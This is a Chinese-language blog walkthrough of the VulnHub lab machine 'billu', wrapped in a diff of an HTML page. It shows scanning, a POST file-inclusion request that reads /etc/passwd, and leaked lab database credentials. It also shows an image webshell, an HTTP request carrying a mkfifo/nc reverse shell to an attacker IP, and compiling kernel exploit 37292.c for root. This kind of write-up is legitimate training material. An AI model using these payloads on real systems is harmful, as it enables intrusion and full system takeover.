@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/154585050?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 靶机信息
+billu是vulnhub中的一台简单难度的渗透测试靶机
+
+# 初始信息枚举
+tcp端口扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
+└─$ sudo nmap -sT -sV -p22,80 -O 192.168.218.195 -oA nmapScan/detail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 12:47 EDT
+Nmap scan report for 192.168.218.195
+Host is up (0.00055s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+MAC Address: 00:0C:29:21:56:B7 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.14 (98%), Linux 3.8 - 3.16 (98%), Linux 3.10 - 4.11 (94%), Linux 3.13 - 4.4 (94%), Linux 3.13 (94%), Linux 3.13 - 3.16 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Android 5.0 - 6.0.1 (Linux 3.4) (94%), Android 8 - 9 (Linux 3.18 - 4.4) (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
+```
+udp没有端口开放
+漏洞扫描没有扫出来什么信息
+
+# web枚举
+目录扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
+└─$ gobuster dir -u http://192.168.218.195 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x html,php,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.218.195
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 319] [--> http://192.168.218.195/images/]
+/test                 (Status: 200) [Size: 72]
+/test.php             (Status: 200) [Size: 72]
+/add                  (Status: 200) [Size: 307]
+/add.php              (Status: 200) [Size: 307]
+/c.php                (Status: 200) [Size: 1]
+/c                    (Status: 200) [Size: 1]
+/index.php            (Status: 200) [Size: 3267]
+/index                (Status: 200) [Size: 3267]
+/panel.php            (Status: 302) [Size: 2469] [--> index.php]
+/panel                (Status: 302) [Size: 2469] [--> index.php]
+/show                 (Status: 200) [Size: 1]
+/show.php             (Status: 200) [Size: 1]
+/in                   (Status: 200) [Size: 47531]
+/in.php               (Status: 200) [Size: 47535]
+/uploaded_images      (Status: 301) [Size: 328] [--> http://192.168.218.195/uploaded_images/]
+/server-status        (Status: 403) [Size: 296]
+/head                 (Status: 200) [Size: 2793]
+/head.php             (Status: 200) [Size: 2793]
+/phpmy                (Status: 301) [Size: 318] [--> http://192.168.218.195/phpmy/]
+/index.php            (Status: 200) [Size: 3267]
+/index                (Status: 200) [Size: 3267]
+Progress: 224656 / 224660 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+有很多目录可以访问，全部curl下来
+```
+┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]                                                                                                                                                     
+└─$ for dir in $(cat dir | awk -F '\(' '{print $1}' | tr -d '/' );do curl http://192.168.218.195/$dir > $dir ;done 
+```
+先看主页，明确是sql注入，手注加sqlmap都没注入进去。">
+<meta property="og:title" content="billu">
+<meta property="og:description" content="# 靶机信息
+billu是vulnhub中的一台简单难度的渗透测试靶机
+
+# 初始信息枚举
+tcp端口扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
+└─$ sudo nmap -sT -sV -p22,80 -O 192.168.218.195 -oA nmapScan/detail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 12:47 EDT
+Nmap scan report for 192.168.218.195
+Host is up (0.00055s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+MAC Address: 00:0C:29:21:56:B7 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.14 (98%), Linux 3.8 - 3.16 (98%), Linux 3.10 - 4.11 (94%), Linux 3.13 - 4.4 (94%), Linux 3.13 (94%), Linux 3.13 - 3.16 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Android 5.0 - 6.0.1 (Linux 3.4) (94%), Android 8 - 9 (Linux 3.18 - 4.4) (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
+```
+udp没有端口开放
+漏洞扫描没有扫出来什么信息
+
+# web枚举
+目录扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
+└─$ gobuster dir -u http://192.168.218.195 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x html,php,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.218.195
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 319] [--> http://192.168.218.195/images/]
+/test                 (Status: 200) [Size: 72]
+/test.php             (Status: 200) [Size: 72]
+/add                  (Status: 200) [Size: 307]
+/add.php              (Status: 200) [Size: 307]
+/c.php                (Status: 200) [Size: 1]
+/c                    (Status: 200) [Size: 1]
+/index.php            (Status: 200) [Size: 3267]
+/index                (Status: 200) [Size: 3267]
+/panel.php            (Status: 302) [Size: 2469] [--> index.php]
+/panel                (Status: 302) [Size: 2469] [--> index.php]
+/show                 (Status: 200) [Size: 1]
+/show.php             (Status: 200) [Size: 1]
+/in                   (Status: 200) [Size: 47531]
+/in.php               (Status: 200) [Size: 47535]
+/uploaded_images      (Status: 301) [Size: 328] [--> http://192.168.218.195/uploaded_images/]
+/server-status        (Status: 403) [Size: 296]
+/head                 (Status: 200) [Size: 2793]
+/head.php             (Status: 200) [Size: 2793]
+/phpmy                (Status: 301) [Size: 318] [--> http://192.168.218.195/phpmy/]
+/index.php            (Status: 200) [Size: 3267]
+/index                (Status: 200) [Size: 3267]
+Progress: 224656 / 224660 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+有很多目录可以访问，全部curl下来
+```
+┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]                                                                                                                                                     
+└─$ for dir in $(cat dir | awk -F '\(' '{print $1}' | tr -d '/' );do curl http://192.168.218.195/$dir > $dir ;done 
+```
+先看主页，明确是sql注入，手注加sqlmap都没注入进去。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dehua-rd.github.io/post/billu.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/154585050?v=4">
+<title>billu</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">billu</h1>
+<div class="title-right">
+    <a href="https://dehua-rd.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/dehua-rd/dehua-rd.github.io/issues/12" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>靶机信息</h1>
+<p>billu是vulnhub中的一台简单难度的渗透测试靶机</p>
+<h1>初始信息枚举</h1>
+<p>tcp端口扫描</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
+└─$ sudo nmap -sT -sV -p22,80 -O 192.168.218.195 -oA nmapScan/detail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 12:47 EDT
+Nmap scan report for 192.168.218.195
+Host is up (0.00055s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+MAC Address: 00:0C:29:21:56:B7 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.14 (98%), Linux 3.8 - 3.16 (98%), Linux 3.10 - 4.11 (94%), Linux 3.13 - 4.4 (94%), Linux 3.13 (94%), Linux 3.13 - 3.16 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Android 5.0 - 6.0.1 (Linux 3.4) (94%), Android 8 - 9 (Linux 3.18 - 4.4) (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
+</code></pre>
+<p>udp没有端口开放<br>
+漏洞扫描没有扫出来什么信息</p>
+<h1>web枚举</h1>
+<p>目录扫描</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
+└─$ gobuster dir -u http://192.168.218.195 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x html,php,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.218.195
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 319] [--&gt; http://192.168.218.195/images/]
+/test                 (Status: 200) [Size: 72]
+/test.php             (Status: 200) [Size: 72]
+/add                  (Status: 200) [Size: 307]
+/add.php              (Status: 200) [Size: 307]
+/c.php                (Status: 200) [Size: 1]
+/c                    (Status: 200) [Size: 1]
+/index.php            (Status: 200) [Size: 3267]
+/index                (Status: 200) [Size: 3267]
+/panel.php            (Status: 302) [Size: 2469] [--&gt; index.php]
+/panel                (Status: 302) [Size: 2469] [--&gt; index.php]
+/show                 (Status: 200) [Size: 1]
+/show.php             (Status: 200) [Size: 1]
+/in                   (Status: 200) [Size: 47531]
+/in.php               (Status: 200) [Size: 47535]
+/uploaded_images      (Status: 301) [Size: 328] [--&gt; http://192.168.218.195/uploaded_images/]
+/server-status        (Status: 403) [Size: 296]
+/head                 (Status: 200) [Size: 2793]
+/head.php             (Status: 200) [Size: 2793]
+/phpmy                (Status: 301) [Size: 318] [--&gt; http://192.168.218.195/phpmy/]
+/index.php            (Status: 200) [Size: 3267]
+/index                (Status: 200) [Size: 3267]
+Progress: 224656 / 224660 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<p>有很多目录可以访问，全部curl下来</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]                                                                                                                                                     
+└─$ for dir in $(cat dir | awk -F '\(' '{print $1}' | tr -d '/' );do curl http://192.168.218.195/$dir &gt; $dir ;done 
+</code></pre>
+<p>先看主页，明确是sql注入，手注加sqlmap都没注入进去。<br>
+先看看别的路径，访问 add.php 弹出来一个上传页面，但是没有任何回显<br>
+访问 in 有 phpinfo() 回显<br>
+访问panel会重定向到index<br>
+访问phpmy有phpmyamdin管理端<br>
+访问test.php有回显说file参数是空的，添加file参数，好像包含不出什么东西。再试一下post提交，确实有文件包含</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]
+└─$ curl -X POST --data 'file=../../../../../../../../../etc/passwd' http://192.168.218.195/test.php
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:106::/var/run/dbus:/bin/false
+whoopsie:x:104:107::/nonexistent:/bin/false
+landscape:x:105:110::/var/lib/landscape:/bin/false
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
+</code></pre>
+<p>访问uploaded_images有三张图片。</p>
+<p>利用文件包含看一下index.php源码</p>
+<pre class="notranslate"><code class="notranslate">&lt;?php                                                                                                                                                                                               
+session_start();                                                                                                                                                                                    
+                                                                                                                                                                                                    
+include('c.php');                                                                                                                                                                                   
+include('head.php');                                                                                                                                                                                
+if(@$_SESSION['logged']!=true)                                                                                                                                                                      
+{                                                                                                                                                                                                   
+        $_SESSION['logged']='';
+
+}
+
+if($_SESSION['logged']==true &amp;&amp;  $_SESSION['admin']!='')
+{
+
+        echo "you are logged in :)";
+        header('Location: panel.php', true, 302); 
+}
+else
+{
+echo '&lt;div align=center style="margin:30px 0px 0px 0px;"&gt;
+&lt;font size=8 face="comic sans ms"&gt;--==[[ billu b0x ]]==--&lt;/font&gt; 
+&lt;br&gt;&lt;br&gt;
+Show me your SQLI skills &lt;br&gt;
+&lt;form method=post&gt;
+Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;
+&lt;input type=submit name=login value="let\'s login"&gt;';
+}
+if(isset($_POST['login']))
+{
+        $uname=str_replace('\'','',urldecode($_POST['un']));
+        $pass=str_replace('\'','',urldecode($_POST['ps']));
+        $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
+        $result = mysqli_query($conn, $run);
+if (mysqli_num_rows($result) &gt; 0) {
+
+$row = mysqli_fetch_assoc($result);
+           echo "You are allowed&lt;br&gt;";
+           $_SESSION['logged']=true;
+           $_SESSION['admin']=$row['username'];
+           
+         header('Location: panel.php', true, 302);
+    
+}
+else
+{
+        echo "&lt;script&gt;alert('Try again');&lt;/script&gt;";
+}
+
+}
+echo "&lt;font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\"&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; ";
+
+?&gt;
+</code></pre>
+<p>源码开头有包含 c.php 问价，也扒拉下来看一看</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
+└─$ curl -X POST --data 'file=c.php' http://192.168.218.195/test.php            
+&lt;?php
+#header( 'Z-Powered-By:its chutiyapa xD' );
+header('X-Frame-Options: SAMEORIGIN');
+header( 'Server:testing only' );
+header( 'X-Powered-By:testing only' );
+
+ini_set( 'session.cookie_httponly', 1 );
+
+$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
+
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo "connection failed -&gt;  " . mysqli_connect_error();
+  }
+
+?&gt;
+</code></pre>
+<p>是连接数据库的文件，暴露了数据库的用户名和密码，可以使用 <strong>billu:b0x_billu</strong> 连接phpmy，有三张表，除了第一张提供一组凭据 <strong>biLLu:hEx_it</strong> 连不上ssh</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7e73eaab-bf5c-42af-a297-82003da5038c"><img width="1919" height="915" alt="Image" src="https://github.com/user-attachments/assets/7e73eaab-bf5c-42af-a297-82003da5038c" style="max-width: 100%; height: auto; max-height: 915px;"></a></p>
+<p>回头再看看源码，利用一下sql注入，不对，上面的凭据可以直接登录进去。<br>
+点击继续，出现文件上传功能。提醒<code class="notranslate">i told you dear, only png,jpg and gif file are allowed</code><br>
+扒一下源码</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]                                                                                                                                                     
+└─$ curl -X POST --data 'file=panel.php' http://192.168.218.195/test.php                                                                                                                            
+&lt;?php                                                                                                                                                                                               
+session_start();                                                                                                                                                                                    
+                                                                                                                                                                                                    
+include('c.php');                                                                                                                                                                                   
+include('head2.php');                                                                                                                                                                               
+if(@$_SESSION['logged']!=true )                                                                                                                                                                     
+{                                                                                                                                                                                                   
+                header('Location: index.php', true, 302);                                                                                                                                           
+                exit();                                                                                                                                                                             
+                                                                                                                                                                                                    
+}                                                                                                                                                                                                   
+                                                                                                                                                                                                    
+                                                                                                                                                                                                    
+                                                                                                                                                                                                    
+echo "Welcome to billu b0x ";                                                                                                                                                                       
+echo '&lt;form method=post style="margin: 10px 0px 10px 95%;"&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;';                                                                                        
+if(isset($_POST['lg']))                                                                                                                                                                             
+{                                                                                                                                                                                                   
+        unset($_SESSION['logged']);                                                                                                                                                                 
+        unset($_SESSION['admin']);                                                                                                                                                                  
+        header('Location: index.php', true, 302);                                                                                                                                                   
+}                                                                                                                                                                                                   
+echo '&lt;hr&gt;&lt;br&gt;';                                                                                                                                                                                    
+                                                                                                                                                                                                    
+echo '&lt;form method=post&gt;                                                                                                                                                                            
+                                                                                                                                                                                                    
+&lt;select name=load&gt;                                                                                                                                                                                  
+    &lt;option value="show"&gt;Show Users&lt;/option&gt;                                                                                                                                                        
+        &lt;option value="add"&gt;Add User&lt;/option&gt;                                                                                                                                                       
+&lt;/select&gt;                                                                                                                                                                                           
+                                                                                                                                                                                                    
+ &amp;nbsp&lt;input type=submit name=continue value="continue"&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;';                                                                                                                           
+if(isset($_POST['continue']))                                                                                                                                                                       
+{                                                                                                                                                                                                   
+        $dir=getcwd();                                                                                                                                                                              
+        $choice=str_replace('./','',$_POST['load']);                                                                                                                                                
+                                                                                                                                                                                                    
+        if($choice==='add')                                                                                                                                                                         
+        {                                                                                                                                                                                           
+                include($dir.'/'.$choice.'.php');   
+if($choice==='add')                                                                                                                                                                         
+        {                                                                                                                                                                                           
+                include($dir.'/'.$choice.'.php');                                                                                                                                                   
+                        die();
+        }
+
+        if($choice==='show')
+        {
+         
+                include($dir.'/'.$choice.'.php'); 
+                die();
+        }
+        else
+        {
+                include($dir.'/'.$_POST['load']); 
+        }
+
+}
+
+
+if(isset($_POST['upload']))
+{
+
+        $name=mysqli_real_escape_string($conn,$_POST['name']);
+        $address=mysqli_real_escape_string($conn,$_POST['address']);
+        $id=mysqli_real_escape_string($conn,$_POST['id']);
+
+        if(!empty($_FILES['image']['name']))
+        {
+                $iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
+        $r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
+        $image=array('jpeg','jpg','gif','png');
+        if(in_array($r,$image))
+        {
+                $finfo = @new finfo(FILEINFO_MIME); 
+        $filetype = @$finfo-&gt;file($_FILES['image']['tmp_name']);
+                if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
+                                {
+                                        if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
+                                                         {
+                                                          echo "Uploaded successfully ";
+                                                          $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; 
+                                                         mysqli_query($conn, $update);
+                                                      }
+                                }
+                        else
+                        {
+                                echo "&lt;br&gt;i told you dear, only png,jpg and gif file are allowed"; 
+                        }
+        }
+        else
+        {
+                echo "&lt;br&gt;only png,jpg and gif file are allowed";
+
+        }
+}
+
+
+}
+
+?&gt;
+</code></pre>
+<p>查看源码，上面的show功能也有文件包含漏洞。<br>
+这里add上传文件并写入数据库，上传信息跟数据库格式差不多，上传的位置在/uploaded_images/下</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ca20a1fe-a3cf-40a9-a984-d39f98623bb8"><img width="1919" height="914" alt="Image" src="https://github.com/user-attachments/assets/ca20a1fe-a3cf-40a9-a984-d39f98623bb8" style="max-width: 100%; height: auto; max-height: 914px;"></a></p>
+<p>随便上传一张图片上去，确实在数据库保存了信息，看看怎么上传木马上去</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/eeb9d87a-45a9-4417-9e01-e5b4f3802b90"><img width="1911" height="886" alt="Image" src="https://github.com/user-attachments/assets/eeb9d87a-45a9-4417-9e01-e5b4f3802b90" style="max-width: 100%; height: auto; max-height: 886px;"></a></p>
+上传图片马上去，再利用上面的show功能包含文件，执行图片马，成功执行命令，开始拿shell
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0ab0c900-0f65-41f9-a2be-4aafad71598b"><img width="1597" height="867" alt="Image" src="https://github.com/user-attachments/assets/0ab0c900-0f65-41f9-a2be-4aafad71598b" style="max-width: 100%; height: auto; max-height: 867px;"></a></p>
+<p>我使用的管道马拿shell</p>
+<pre class="notranslate"><code class="notranslate">POST /panel.php?cmd=rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/bash+-i+2&gt;%261+|+nc+192.168.218.148+4444+&gt;+/tmp/f  HTTP/1.1
+Host: 192.168.218.195
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: http://192.168.218.195
+Connection: keep-alive
+Referer: http://192.168.218.195/panel.php
+Cookie: PHPSESSID=ppjg63dvsubk192fckedl233t5
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+load=uploaded_images/abc.jpg&amp;continue=continue
+</code></pre>
+<h1>提权</h1>
+<p>最后的提权部分我就卡住了，翻找了很久也没找到什么信息，最后还是看了提示。有配置文件密码重用，和内核提权</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]                                                   │
+└─$ searchsploit 3.13.0                                                                           │
+---------------------------------------------------------------- ---------------------------------│
+ Exploit Title                                                  |  Path                           │
+---------------------------------------------------------------- ---------------------------------│
+Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ' | linux/local/37292.c             │
+Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ' | linux/local/37293.txt           │
+Unified Remote 3.13.0 - Remote Code Execution (RCE)             | windows/remote/51309.py         │
+---------------------------------------------------------------- ---------------------------------│
+Shellcodes: No Results   
+</code></pre>
+<pre class="notranslate"><code class="notranslate">www-data@indishell:/tmp$ gcc 3  -o payload
+gcc 37292.c -o payload
+www-data@indishell:/tmp$ ls
+ls
+37292.c  f  payload
+www-data@indishell:/tmp$ ./payload
+./payload
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami
+whoami
+root
+# 
+</code></pre>
+<p>提权成功<br>
+另一种就是找  <strong>/var/www/phpmy/config.inc.php</strong> 文件，里面有数据库root用户和密码，使用ssh可以重用密码。</p>
+<h1>反思</h1>
+<p>漏洞利用主要文件包含漏洞利用、php代码审计、sql注入原理、图片木马，反弹shell的使用和url编码技巧。靶机本身不难，但是综合利用还是有很多技巧和思路的。比如在利用图片马的时候就必须使用当前页面的show功能的文件包含才能执行木马，这里也很容易疏忽导致图片马无法成功利用，这个靶机还是非常不错的。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://dehua-rd.github.io">dehua</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
